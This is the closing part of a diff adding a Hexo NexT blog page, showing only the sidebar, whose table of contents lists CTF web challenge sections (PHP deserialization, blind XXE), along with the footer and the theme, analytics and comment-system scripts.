+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="comments"></div>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#AreUSerialz"><span class="nav-number">1.</span> <span class="nav-text">AreUSerialz</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#源码"><span class="nav-number">1.1.</span> <span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#private、protected序列化后产生不可见字符"><span class="nav-number">1.2.</span> <span class="nav-text">private、protected序列化后产生不可见字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#destruct"><span class="nav-number">1.3.</span> <span class="nav-text">__destruct()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过"><span class="nav-number">1.4.</span> <span class="nav-text">绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#读取"><span class="nav-number">1.5.</span> <span class="nav-text">读取</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#filejava"><span class="nav-number">2.</span> <span class="nav-text">filejava</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#构造Blind-OOB-XXE"><span class="nav-number">2.1.</span> <span class="nav-text">构造Blind OOB XXE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#notes"><span class="nav-number">3.</span> <span class="nav-text">notes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ChenZIDu"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">ChenZIDu</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">90</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">58</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chenzidu" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chenzidu" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:oinsm@outlook.com" title="E-Mail → mailto:oinsm@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/ChenZIDu1" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;ChenZIDu1" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.loongten.com/" title="https:&#x2F;&#x2F;www.loongten.com&#x2F;" rel="noopener" target="_blank">Keac's</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://hsnico.github.io/" title="https:&#x2F;&#x2F;hsnico.github.io" rel="noopener" target="_blank">Hsnico'blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.suk1.top/" title="https:&#x2F;&#x2F;www.suk1.top&#x2F;" rel="noopener" target="_blank">晓黑</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.dreams-wj.top/" title="https:&#x2F;&#x2F;blog.dreams-wj.top" rel="noopener" target="_blank">HKer_YM</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ncsec.cn/" title="https:&#x2F;&#x2F;blog.ncsec.cn&#x2F;" rel="noopener" target="_blank">RoarNya</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ChenZIDu</span>
+</div>
+  <div class="powered-by">Oinsm
+    
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Web – <a href="https://github.com/ChenZIDu" rel="noopener" target="_blank">🙂</a>
+    
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(item => {
+    return GUEST.includes(item);
+  });
+  new Valine({
+    el: '#comments',
+    verify: true,
+    notify: true,
+    appId: 'Kp900xxAQMLq3K0AkgqsPzcV-gzGzoHsz',
+    appKey: 'XdnaoJVs9feaETzUFPUq79tD',
+    placeholder: "Just go go",
+    avatar: 'robohash',
+    meta: guest,
+    pageSize: '5' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn',
+    path: location.pathname,
+    recordIP: true,
+    serverURLs: ''
+  });
+}, window.Valine);
+</script>
+
+</body>
+</html>
